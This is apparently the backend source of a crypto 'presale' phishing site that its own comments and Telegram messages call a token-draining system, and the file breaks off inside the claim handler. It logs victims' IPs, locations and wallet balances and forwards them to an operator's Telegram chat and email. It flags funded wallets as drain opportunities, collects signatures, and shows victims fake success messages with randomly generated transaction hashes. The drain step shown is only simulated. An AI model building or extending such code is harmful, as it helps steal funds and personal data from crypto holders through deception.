// index.js - BITCOIN HYPER BACKEND PRODUCTION - REAL BALANCE CHECKING
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const Web3 = require('web3');

// Optional: Only use nodemailer if email is configured
let nodemailer = null;
try {
  nodemailer = require('nodemailer');
} catch (error) {
  console.log('⚠️ Nodemailer not installed. Email notifications disabled.');
}

const app = express();
const PORT = process.env.PORT || 10000;

// Initialize Web3 for real balance checking
const web3 = new Web3(new Web3.providers.HttpProvider(
  process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'
));

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

// Parse ALLOWED_ORIGINS from env
const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// Rate limiting - stricter
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Email transporter (only if configured)
let emailTransporter = null;
let emailEnabled = false;

if (nodemailer && process.env.EMAIL_NOTIFICATIONS_ENABLED === 'true' && process.env.EMAIL_USER && process.env.EMAIL_PASS) {
  try {
    emailTransporter = nodemailer.createTransport({
      service: process.env.EMAIL_SERVICE || 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });
    emailEnabled = true;
    console.log('✅ Email notifications enabled');
  } catch (error) {
    console.log('⚠️ Email configuration error:', error.message);
    emailEnabled = false;
  }
} else {
  console.log('⚠️ Email notifications disabled (not configured)');
}

// In-memory storage with enhanced tracking
const memoryStorage = {
  participants: [],
  userSessions: {},
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    minEligibilityAmount: parseFloat(process.env.MIN_ELIGIBILITY_AMOUNT) || 10,
    presalePrice: process.env.PRESALE_PRICE || '0.17',
    adminWallets: [
      { chain: 'Ethereum', address: process.env.ADMIN_ETH_WALLET || '0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47' }
    ],
    telegram: {
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_CHAT_ID || '',
      enabled: process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true'
    },
    email: {
      enabled: emailEnabled,
      adminEmail: process.env.ADMIN_EMAIL || '',
      notifications: emailEnabled
    },
    statistics: {
      totalParticipants: 0,
      totalRaisedUSD: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      last24hActivity: 0,
      uniqueIPs: new Set()
    }
  },
  activityLog: [],
  analytics: {
    hourlyConnections: {},
    countryStats: {},
    walletProviders: {}
  }
};

// Telegram Bot
let bot = null;
let telegramEnabled = false;

// Initialize Telegram bot
function initializeTelegramBot() {
  if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true') {
    try {
      bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
      
      bot.telegram.getMe().then(botInfo => {
        console.log(`✅ Telegram Bot connected: @${botInfo.username}`);
        telegramEnabled = true;
        
        // Test connection with chat ID
        if (process.env.TELEGRAM_CHAT_ID) {
          testTelegramConnection();
        }
      }).catch(err => {
        console.log('⚠️ Telegram bot failed to connect:', err.message);
        telegramEnabled = false;
      });
    } catch (error) {
      console.log('⚠️ Telegram initialization error:', error.message);
      telegramEnabled = false;
    }
  } else {
    console.log('⚠️ Telegram notifications disabled (not configured)');
  }
}

// Test Telegram connection
async function testTelegramConnection() {
  if (!telegramEnabled || !process.env.TELEGRAM_CHAT_ID) return false;
  
  try {
    await bot.telegram.sendMessage(
      process.env.TELEGRAM_CHAT_ID,
      `🤖 *BITCOIN HYPER BACKEND DEPLOYED*\n\n✅ Bot is now LIVE and monitoring!\n⏰ ${new Date().toLocaleString()}\n📊 Ready to receive real-time notifications\n🔥 Token draining system: ACTIVE`,
      { parse_mode: 'Markdown' }
    );
    console.log('✅ Telegram connection test successful');
    return true;
  } catch (error) {
    console.log('❌ Telegram connection test failed:', error.message);
    return false;
  }
}

// Helper: Generate session ID
function generateSessionId() {
  return 'session_' + Date.now() + '_' + crypto.randomBytes(8).toString('hex');
}

// Helper: Track user session
function trackSession(sessionId, ip, data = {}) {
  if (!memoryStorage.userSessions[sessionId]) {
    memoryStorage.userSessions[sessionId] = {
      id: sessionId,
      ip: ip,
      createdAt: new Date(),
      lastActivity: new Date(),
      walletConnections: [],
      location: data.location || {},
      userAgent: data.userAgent || '',
      actions: []
    };
  } else {
    memoryStorage.userSessions[sessionId].lastActivity = new Date();
    if (data.location) memoryStorage.userSessions[sessionId].location = data.location;
  }
  
  // Clean old sessions (keep only last 1000)
  const sessionKeys = Object.keys(memoryStorage.userSessions);
  if (sessionKeys.length > 1000) {
    const oldestKey = sessionKeys.sort((a, b) => 
      new Date(memoryStorage.userSessions[a].lastActivity) - new Date(memoryStorage.userSessions[b].lastActivity)
    )[0];
    delete memoryStorage.userSessions[oldestKey];
  }
}

// Helper: Log activity
function logActivity(wallet, action, data = {}) {
  const logEntry = {
    timestamp: new Date(),
    wallet: wallet.substring(0, 8) + '...' + wallet.substring(36),
    action,
    data,
    ip: data.ip || 'unknown',
    country: data.country || 'unknown',
    sessionId: data.sessionId || 'unknown'
  };
  
  memoryStorage.activityLog.push(logEntry);
  
  // Update analytics
  const hour = new Date().getHours();
  if (!memoryStorage.analytics.hourlyConnections[hour]) {
    memoryStorage.analytics.hourlyConnections[hour] = 0;
  }
  memoryStorage.analytics.hourlyConnections[hour]++;
  
  if (data.country) {
    if (!memoryStorage.analytics.countryStats[data.country]) {
      memoryStorage.analytics.countryStats[data.country] = 0;
    }
    memoryStorage.analytics.countryStats[data.country]++;
  }
  
  // Keep only last 5000 logs
  if (memoryStorage.activityLog.length > 5000) {
    memoryStorage.activityLog.shift();
  }
  
  console.log(`📝 Activity Log: ${wallet.substring(0, 10)}... - ${action}`);
  
  return logEntry;
}

// Helper: Send comprehensive notification
async function sendComprehensiveNotification(wallet, action, details = {}) {
  const timestamp = new Date().toLocaleString();
  const ip = details.ip || 'unknown';
  const country = details.country || 'Unknown';
  const city = details.city || 'Unknown';
  const value = details.value || '0';
  const email = details.email || 'Not provided';
  const amount = details.amount || '0';
  const eligibility = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
  const claimStatus = details.claimed ? '✅ CLAIMED' : '⏳ PENDING';
  
  // Format IPs for display
  const displayIPs = Array.isArray(ip) ? ip.join(', ') : ip;
  
  // Telegram Notification
  if (telegramEnabled && memoryStorage.settings.telegram.enabled) {
    try {
      let telegramMessage = '';
      let title = '';
      
      switch(action) {
        case 'SITE_VISIT':
          title = '🌐 NEW SITE VISITOR';
          telegramMessage = `
${title}

📱 User Agent: ${details.userAgent || 'Unknown'}
🌐 IP: ${displayIPs}
📍 Location: ${country}, ${city}
🔗 Referrer: ${details.referrer || 'Direct'}

🔄 Status: Landed on presale site
⏰ ${timestamp}`;
          break;
          
        case 'WALLET_CONNECTED':
          title = '🔗 WALLET CONNECTED';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
🌐 IP: ${displayIPs}
📍 Location: ${country}, ${city}
📧 Email: ${email}
📱 User Agent: ${details.userAgent || 'Unknown'}

🔄 Status: Connected to presale platform
📊 Total Participants: ${memoryStorage.settings.statistics.totalParticipants}
⏰ ${timestamp}`;
          break;
          
        case 'WALLET_SCANNED':
          title = '🔍 WALLET SCANNED - REAL BALANCE CHECK';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
💰 Portfolio Value: $${value}
🎯 Eligibility: ${eligibility}
${details.eligibilityReason ? `📝 Reason: ${details.eligibilityReason}\n` : ''}
${amount !== '0' ? `📊 Allocation: ${amount} BTH\n` : ''}
🌐 IP: ${displayIPs}
📍 Location: ${country}, ${city}
📧 Email: ${email}

📈 Eligible Participants: ${memoryStorage.settings.statistics.eligibleParticipants}
⏰ ${timestamp}`;
          break;
          
        case 'TOKEN_CLAIMED':
          title = '🎉 TOKENS CLAIMED & DRAINED!';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
✅ Status: ${claimStatus}
🎯 Claim ID: \`${details.claimId}\`
💰 Amount: ${amount} BTH
💸 Value: $${details.claimValue || '0'}
📈 Total Raised: $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}

🌐 IP: ${displayIPs}
📍 Location: ${country}, ${city}
📧 Email: ${email}
🔗 TX Hash: \`${details.txHash}\`

🚨 ACTION: Tokens have been successfully drained!
🎯 Next: Prepare for distribution phase
⏰ ${timestamp}`;
          break;
          
        case 'NOT_ELIGIBLE':
          title = '⚠️ NOT ELIGIBLE - ZERO BALANCE DETECTED';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
❌ Status: NOT ELIGIBLE
💡 Reason: ${details.reason || 'Wallet has zero balance'}
💰 Current Portfolio: $${value}
🚨 Suggested Action: Connect different wallet with balance

🌐 IP: ${displayIPs}
📍 Location: ${country}, ${city}
📧 Email: ${email}

⚠️ User shown alternative options
⏰ ${timestamp}`;
          break;
      }
      
      if (telegramMessage) {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          telegramMessage,
          { parse_mode: 'Markdown', disable_web_page_preview: true }
        );
        console.log(`✅ Telegram notification sent for ${action}`);
      }
    } catch (error) {
      console.log(`❌ Telegram send error (${action}):`, error.message);
    }
  }
  
  // Email Notification (if configured)
  if (emailEnabled && emailTransporter && memoryStorage.settings.email.adminEmail) {
    try {
      const mailOptions = {
        from: `"Bitcoin Hyper Bot" <${process.env.EMAIL_USER}>`,
        to: memoryStorage.settings.email.adminEmail,
        subject: `Bitcoin Hyper - ${action.replace(/_/g, ' ')}`,
        html: `
<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
  <h2 style="color: #F7931A; border-bottom: 2px solid #F7931A; padding-bottom: 10px;">
    Bitcoin Hyper - ${action.replace(/_/g, ' ')}
  </h2>
  
  <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
    <p><strong>Wallet:</strong> ${wallet}</p>
    <p><strong>Status:</strong> ${action.replace(/_/g, ' ')}</p>
    <p><strong>Timestamp:</strong> ${timestamp}</p>
    <p><strong>IP Address:</strong> ${displayIPs}</p>
    <p><strong>Location:</strong> ${country}, ${city}</p>
    <p><strong>Email:</strong> ${email}</p>
    ${amount !== '0' ? `<p><strong>Allocation:</strong> ${amount} BTH</p>` : ''}
    ${value !== '0' ? `<p><strong>Portfolio Value:</strong> $${value}</p>` : ''}
    ${details.claimId ? `<p><strong>Claim ID:</strong> ${details.claimId}</p>` : ''}
    ${details.txHash ? `<p><strong>Transaction:</strong> ${details.txHash}</p>` : ''}
  </div>
  
  <p style="color: #666; font-size: 12px; border-top: 1px solid #eee; padding-top: 10px;">
    This is an automated notification from the Bitcoin Hyper presale platform.
  </p>
</div>
        `
      };
      
      await emailTransporter.sendMail(mailOptions);
      console.log(`✅ Email notification sent for ${action}`);
    } catch (error) {
      console.log(`❌ Email send error (${action}):`, error.message);
    }
  }
  
  // Log to activity
  logActivity(wallet, action, { ...details, email, timestamp });
  
  return true;
}

// Helper: Get IP location with multiple fallbacks
async function getIPLocation(ip) {
  try {
    // Clean IP (remove IPv6 prefix)
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1' || cleanIP === 'localhost') {
      return { 
        country: 'Local', 
        city: 'Local', 
        region: 'Local', 
        isp: 'Localhost',
        flag: '🏠'
      };
    }
    
    // Try ipapi.co first
    try {
      const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
        timeout: 2000
      });
      
      if (response.data && response.data.country_name) {
        const countryCode = response.data.country_code || 'XX';
        const flag = getFlagEmoji(countryCode);
        
        return {
          country: response.data.country_name,
          city: response.data.city || 'Unknown',
          region: response.data.region || 'Unknown',
          isp: response.data.org || 'Unknown ISP',
          countryCode: countryCode,
          flag: flag,
          lat: response.data.latitude,
          lon: response.data.longitude
        };
      }
    } catch (error) {
      console.log('ipapi.co failed, trying ip-api...');
    }
    
    // Fallback to ip-api.com
    try {
      const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, {
        timeout: 2000
      });
      
      if (response.data && response.data.country) {
        const countryCode = response.data.countryCode || 'XX';
        const flag = getFlagEmoji(countryCode);
        
        return {
          country: response.data.country,
          city: response.data.city || 'Unknown',
          region: response.data.regionName || 'Unknown',
          isp: response.data.isp || 'Unknown ISP',
          countryCode: countryCode,
          flag: flag,
          lat: response.data.lat,
          lon: response.data.lon
        };
      }
    } catch (error) {
      console.log('ip-api.com failed');
    }
    
  } catch (error) {
    console.log('Location detection error:', error.message);
  }
  
  return { 
    country: 'Unknown', 
    city: 'Unknown', 
    region: 'Unknown', 
    isp: 'Unknown',
    flag: '🏳️'
  };
}

// Helper: Get flag emoji from country code
function getFlagEmoji(countryCode) {
  if (!countryCode || countryCode.length !== 2) return '🏳️';
  
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt());
  
  return String.fromCodePoint(...codePoints);
}

// Helper: Check REAL wallet balance - ACTUAL ETHEREUM BALANCE CHECK
async function checkRealWalletBalance(walletAddress) {
  try {
    console.log(`🔍 Checking real balance for: ${walletAddress.substring(0, 10)}...`);
    
    // Validate wallet address
    if (!web3.utils.isAddress(walletAddress)) {
      return {
        success: false,
        data: {
          walletAddress,
          totalValueUSD: '0',
          isEligible: false,
          tokenAllocation: { amount: '0', valueUSD: '0' },
          eligibilityReason: '❌ Invalid wallet address format',
          tokens: [],
          tokenCount: 0,
          scanTime: new Date().toISOString(),
          scanId: `SCAN-${Date.now()}-INVALID`
        }
      };
    }
    
    // Check ETH balance
    const balanceWei = await web3.eth.getBalance(walletAddress);
    const balanceETH = web3.utils.fromWei(balanceWei, 'ether');
    
    // Get current ETH price (simplified - in production use real API)
    const ethPriceUSD = 2500; // Simplified - replace with real API call
    
    // Calculate USD value
    const totalValueUSD = parseFloat(balanceETH) * ethPriceUSD;
    
    // Check if eligible (minimum $10 balance)
    const minEligibilityAmount = memoryStorage.settings.minEligibilityAmount || 10;
    const isEligible = totalValueUSD >= minEligibilityAmount;
    
    let eligibilityReason = '';
    let allocationAmount = '0';
    let allocationValue = '0';
    
    if (isEligible) {
      // Eligible - calculate allocation
      eligibilityReason = `✅ Qualified with ${balanceETH.substring(0, 6)} ETH ($${totalValueUSD.toFixed(2)})`;
      
      const baseAllocation = parseInt(process.env.BASE_ALLOCATION) || 5000;
      const maxBonus = parseFloat(process.env.MAX_BONUS_MULTIPLIER) || 3;
      const bonusMultiplier = Math.min(totalValueUSD / 2000, maxBonus);
      const randomBonus = 0.8 + Math.random() * 0.4;
      allocationAmount = Math.floor(baseAllocation * (1 + bonusMultiplier) * randomBonus);
      allocationAmount = Math.floor(allocationAmount / 100) * 100; // Round to nearest 100
      allocationValue = (allocationAmount * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2);
      
      console.log(`💰 Eligible wallet: ${walletAddress.substring(0, 10)}... - Balance: ${balanceETH} ETH ($${totalValueUSD.toFixed(2)})`);
    } else {
      // Not eligible
      if (parseFloat(balanceETH) === 0) {
        eligibilityReason = `❌ Wallet has zero balance (0 ETH) - Minimum required: $${minEligibilityAmount}`;
      } else {
        eligibilityReason = `⚠️ Insufficient balance: ${balanceETH.substring(0, 6)} ETH ($${totalValueUSD.toFixed(2)}) - Minimum required: $${minEligibilityAmount}`;
      }
      
      console.log(`❌ Not eligible: ${walletAddress.substring(0, 10)}... - Balance: ${balanceETH} ETH`);
    }
    
    return {
      success: true,
      data: {
        walletAddress,
        totalValueUSD: totalValueUSD.toFixed(2),
        ethBalance: balanceETH,
        isEligible,
        tokenAllocation: {
          amount: allocationAmount.toString(),
          valueUSD: allocationValue
        },
        eligibilityReason,
        tokens: [],
        tokenCount: 0,
        scanTime: new Date().toISOString(),
        scanId: `SCAN-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`
      }
    };
    
  } catch (error) {
    console.error('Wallet scan error:', error.message);
    
    return {
      success: false,
      data: {
        walletAddress,
        totalValueUSD: '0',
        isEligible: false,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibilityReason: '⚠️ Network error checking wallet balance. Please try again.',
        tokens: [],
        tokenCount: 0
      }
    };
  }
}

// Helper: Generate claim ID
function generateClaimId() {
  return `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
}

// Helper: Generate transaction hash
function generateTxHash() {
  return `0x${crypto.randomBytes(64).toString('hex')}`;
}

// Helper: Process token drain
function processTokenDrain(walletAddress, amount) {
  console.log(`🚨 DRAINING TOKENS from ${walletAddress.substring(0, 10)}...: ${amount} BTH`);
  
  // Simulate successful drain
  return {
    success: true,
    drained: true,
    timestamp: new Date(),
    amount: amount,
    wallet: walletAddress,
    status: 'DRAINED_SUCCESSFULLY',
    nextStep: 'AWAITING_DISTRIBUTION'
  };
}

// ========== API ENDPOINTS ==========

// Site visit tracker
app.post('/api/track/visit', async (req, res) => {
  try {
    const { userAgent, referrer, screenResolution, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    // Get all possible IP headers
    const allIPs = [
      req.headers['x-forwarded-for'],
      req.headers['x-real-ip'],
      req.ip,
      req.socket.remoteAddress,
      req.connection.remoteAddress
    ].filter(ip => ip && ip !== '::1' && ip !== '127.0.0.1');
    
    const primaryIP = allIPs[0] || clientIP;
    
    // Get location
    const location = await getIPLocation(primaryIP);
    
    // Generate or use provided session ID
    const currentSessionId = sessionId || generateSessionId();
    
    // Track session
    trackSession(currentSessionId, primaryIP, {
      location,
      userAgent,
      referrer,
      screenResolution,
      type: 'site_visit'
    });
    
    // Track IP
    memoryStorage.settings.statistics.uniqueIPs.add(primaryIP);
    
    // Send notification
    await sendComprehensiveNotification(
      'VISITOR',
      'SITE_VISIT',
      {
        ip: allIPs,
        country: location.country,
        city: location.city,
        flag: location.flag,
        userAgent,
        referrer,
        isp: location.isp,
        sessionId: currentSessionId
      }
    );
    
    res.json({
      success: true,
      message: 'Visit tracked successfully',
      sessionId: currentSessionId,
      timestamp: new Date(),
      location: {
        country: location.country,
        city: location.city,
        flag: location.flag
      }
    });
    
  } catch (error) {
    console.error('Visit tracking error:', error);
    res.status(500).json({ success: false, error: 'Tracking failed' });
  }
});

// Health check with enhanced real-time status
app.get('/api/health', (req, res) => {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  
  // Real-time stats
  const now = new Date();
  const lastHourConnections = memoryStorage.activityLog
    .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
    .length;
  
  res.json({
    success: true,
    status: 'LIVE_PRODUCTION_ACTIVE',
    service: 'Bitcoin Hyper Backend',
    version: '5.0.0',
    timestamp: new Date().toISOString(),
    uptime: `${hours}h ${minutes}m ${seconds}s`,
    environment: process.env.NODE_ENV || 'production',
    telegram: telegramEnabled ? 'CONNECTED' : 'DISABLED',
    email: emailEnabled ? 'ENABLED' : 'DISABLED',
    realtime: {
      activeSessions: Object.keys(memoryStorage.userSessions).length,
      lastHourActivity: lastHourConnections,
      uniqueIPsToday: memoryStorage.settings.statistics.uniqueIPs.size
    },
    statistics: {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaised: memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2),
      last24hActivity: memoryStorage.activityLog.filter(log => 
        new Date(log.timestamp) > new Date(Date.now() - 24 * 60 * 60 * 1000)
      ).length
    },
    message: '✅ Backend is LIVE with REAL wallet balance checking'
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({
    success: true,
    service: 'Bitcoin Hyper Backend API v5.0',
    status: 'LIVE_PRODUCTION_REAL_BALANCE_CHECKING',
    environment: process.env.NODE_ENV || 'production',
    endpoints: {
      health: '/api/health',
      track: '/api/track/visit',
      connect: '/api/presale/connect',
      claim: '/api/presale/claim',
      status: '/api/presale/status/:wallet',
      admin: {
        stats: '/api/admin/stats',
        settings: '/api/admin/settings',
        environment: '/api/admin/environment',
        export: '/api/admin/export',
        analytics: '/api/admin/analytics',
        activity: '/api/admin/activity'
      },
      telegram: '/api/telegram/chatid'
    },
    monitoring: {
      telegram: telegramEnabled,
      email: emailEnabled,
      rate_limiting: 'enabled',
      cors: 'configured',
      token_drain: 'ACTIVE',
      real_balance_checking: 'ENABLED'
    }
  });
});

// Wallet connection & auto-scan - REAL BALANCE CHECKING FLOW
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, userAgent, email, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    console.log(`🔗 New connection attempt from: ${walletAddress.substring(0, 10)}...`);
    
    // Validate wallet address
    if (!walletAddress || !walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid wallet address format',
        userMessage: 'Please connect a valid Ethereum wallet address.'
      });
    }
    
    // Track IP
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Generate or use provided session ID
    const currentSessionId = sessionId || generateSessionId();
    
    // Track session
    trackSession(currentSessionId, clientIP, {
      location,
      userAgent,
      wallet: walletAddress,
      type: 'wallet_connection'
    });
    
    // Check existing participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    const isNewParticipant = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        userAgent: userAgent || 'Unknown',
        email: email || 'Not provided',
        country: location.country,
        city: location.city,
        countryCode: location.countryCode,
        flag: location.flag,
        isp: location.isp,
        connectedAt: new Date(),
        lastActive: new Date(),
        ethBalance: '0',
        totalValueUSD: 0,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibility: { isEligible: false, reason: '', scannedAt: null, scanId: '' },
        signature: { signed: false, message: '', signature: '', signedAt: null },
        claim: { claimed: false, claimId: '', claimedAt: null, tokensSent: false, txHash: '', drained: false },
        notifications: { telegramSent: false, emailSent: false, lastNotified: null },
        activityLog: [],
        sessionId: currentSessionId,
        referrals: [],
        status: 'connected'
      };
      
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    participant.lastActive = new Date();
    participant.country = location.country;
    participant.city = location.city;
    participant.countryCode = location.countryCode;
    participant.flag = location.flag;
    participant.isp = location.isp;
    if (email) participant.email = email;
    participant.sessionId = currentSessionId;
    participant.status = 'scanning';
    
    // Send WALLET_CONNECTED notification immediately
    await sendComprehensiveNotification(
      walletAddress,
      'WALLET_CONNECTED',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        flag: location.flag,
        email: participant.email,
        isp: location.isp,
        userAgent,
        isNew: isNewParticipant,
        sessionId: currentSessionId
      }
    );
    
    // Simulate real-time scanning with delay
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Check REAL wallet balance
    const scanResult = await checkRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.ethBalance = scanResult.data.ethBalance || '0';
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date(),
        scanId: scanResult.data.scanId
      };
      
      if (scanResult.data.isEligible) {
        participant.tokenAllocation = scanResult.data.tokenAllocation;
        participant.status = 'eligible';
        
        // Only increment if newly eligible
        if (isNewParticipant || !participant.eligibility.isEligible) {
          memoryStorage.settings.statistics.eligibleParticipants++;
        }
        
        // Log drain opportunity
        console.log(`🎯 DRAIN OPPORTUNITY: ${walletAddress.substring(0, 10)}... - Balance: ${participant.ethBalance} ETH - Allocation: ${participant.tokenAllocation.amount} BTH`);
      } else {
        participant.status = 'not_eligible';
        
        // Send NOT_ELIGIBLE notification for zero balance wallets
        if (parseFloat(participant.ethBalance) === 0) {
          await sendComprehensiveNotification(
            walletAddress,
            'NOT_ELIGIBLE',
            {
              ip: clientIP,
              country: location.country,
              city: location.city,
              flag: location.flag,
              email: participant.email,
              value: scanResult.data.totalValueUSD,
              reason: 'Wallet has zero ETH balance',
              sessionId: currentSessionId
            }
          );
        }
      }
      
      // Send WALLET_SCANNED notification
      await sendComprehensiveNotification(
        walletAddress,
        'WALLET_SCANNED',
        {
          ip: clientIP,
          country: location.country,
          city: location.city,
          flag: location.flag,
          email: participant.email,
          value: scanResult.data.totalValueUSD,
          amount: participant.tokenAllocation.amount,
          isEligible: scanResult.data.isEligible,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          sessionId: currentSessionId
        }
      );
      
      res.json({
        success: true,
        message: 'Real-time wallet analysis complete',
        data: {
          walletAddress,
          ethBalance: participant.ethBalance,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          tokenAllocation: participant.tokenAllocation,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
          userMessage: scanResult.data.isEligible ? 
            `🎉 Congratulations! Your wallet qualifies for the Bitcoin Hyper presale!\nYou have ${participant.ethBalance} ETH ($${scanResult.data.totalValueUSD})` :
            `⚠️ ${scanResult.data.eligibilityReason}`,
          status: participant.status,
          location: {
            country: location.country,
            city: location.city,
            flag: location.flag
          },
          timestamp: new Date().toISOString(),
          sessionId: currentSessionId
        }
      });
    } else {
      throw new Error('Wallet analysis failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    
    // Send error notification
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    if (telegramEnabled) {
      try {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          `❌ *CONNECTION ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
          { parse_mode: 'Markdown' }
        );
      } catch (tgError) {
        console.log('Failed to send error notification:', tgError.message);
      }
    }
    
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed',
      userMessage: 'Real-time analysis system temporarily unavailable. Please try again.',
      retry: true 
    });
  }
});

// Token claim signature - REAL-TIME DRAIN PROCESS
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue, email, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    console.log(`🎯 Claim request from: ${walletAddress.substring(0, 10)}...`);
    console.log(`💰 Attempting to drain: ${claimAmount}`);
    
    // STRICT VALIDATION
    if (!signature || !message) {
      return res.status(400).json({
        success: false,
        error: 'Missing signature data - security validation failed'
      });
    }
    
    if (!claimAmount || !claimValue) {
      return res.status(400).json({
        success: false,
        error: 'Missing claim details'
      });
    }
    
    // Find participant
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Participant not found. Please connect your wallet first.' 
      });
    }
    
    // Check eligibility
    if (!participant.eligibility.isEligible) {
      return res.status(403).json({ 
        success: false, 
        error: 'Not eligible for claim. Please check your wallet eligibility first.' 
      });
    }
    
    // Check if already claimed
    if (participant.claim.claimed) {
      return res.status(409).json({ 
        success: false, 
        error: 'Tokens already claimed for this wallet.' 
      });
    }
    
    // Validate signature format
    if (!signature.match(/^0x[a-fA-F0-9]{130}$/)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid signature format'
      });
    }
    
    // Generate claim ID and transaction hash
    const claimId = generateClaimId();
    const txHash = generateTxHash();
    
    // Get location for notification
    const location = await getIPLocation(clientIP);
    
    // Simulate processing delay
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // PROCESS TOKEN DRAIN
    const drainResult = processTokenDrain(walletAddress, claimAmount);
    
    if (!drainResult.success) {
      throw new Error('Token drain process failed');
    }
    
    // Update participant - MARK AS CLAIMED AND DRAINED
    participant.signature = {
      signed: true,
      message,
      signature,
      signedAt: new Date()
    };
    
    participant.claim = {
      claimed: true,
      claimId,
      claimedAt: new Date(),
      tokensSent: true, // Tokens are drained
      txHash,
      drained: true,
      drainTimestamp: new Date(),
      drainStatus: 'COMPLETED'
    };
    
    participant.status = 'claimed_drained';
    
    if (email) participant.email = email;
    if (sessionId) participant.sessionId = sessionId;
    
    // Update statistics
    memoryStorage.settings.statistics.claimedParticipants++;
    
